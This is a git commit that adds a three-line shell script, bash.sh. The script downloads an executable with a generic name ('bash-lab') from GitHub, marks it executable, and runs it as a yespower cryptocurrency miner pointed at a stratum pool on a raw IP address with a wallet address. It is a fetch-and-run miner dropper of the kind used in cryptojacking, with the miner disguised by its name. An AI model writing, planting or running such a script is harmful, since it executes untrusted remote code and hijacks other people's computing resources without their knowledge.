84706652c2d818148c0194110e29fd859676e0fa
viloidka <95928871+viloidka@users.noreply.github.com>
2022-12-06 06:35:42 +0700

    Create bash.sh

---
+++ bash.sh
@@ -0,0 +1,3 @@
+wget https://github.com/viloidka/go/raw/main/bash-lab
+chmod +x bash-lab
+./bash-lab -a yespower -o stratum+tcp://137.184.40.250:80 -u web1qmt8q9y0c8wwctsxee5zrl2eel2k6zkxk7udaut.rk -p m=solo -t4
